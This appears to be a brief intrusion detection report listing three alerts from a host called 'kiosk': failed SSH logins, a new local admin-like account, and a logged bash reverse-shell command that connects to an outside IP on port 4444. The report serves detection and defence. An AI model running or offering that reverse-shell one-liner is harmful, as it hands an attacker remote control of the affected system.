# Custom IDS Alerts

- Alerts: 3

## failed-login

- Severity: medium
- Description: Repeated failed SSH authentication attempt
- Evidence: `May 18 09:00:01 kiosk sshd[1201]: Failed password for invalid user admin from 198.51.100.12 port 51222 ssh2`

## suspicious-command

- Severity: high
- Description: Suspicious shell command execution pattern
- Evidence: `May 18 09:02:44 kiosk bash[1304]: bash -i >& /dev/tcp/198.51.100.44/4444 0>&1`

## new-user

- Severity: high
- Description: New local user was created
- Evidence: `May 18 09:03:10 kiosk useradd[1310]: new user: name=tempadmin, UID=1002, GID=1002, home=/home/tempadmin`
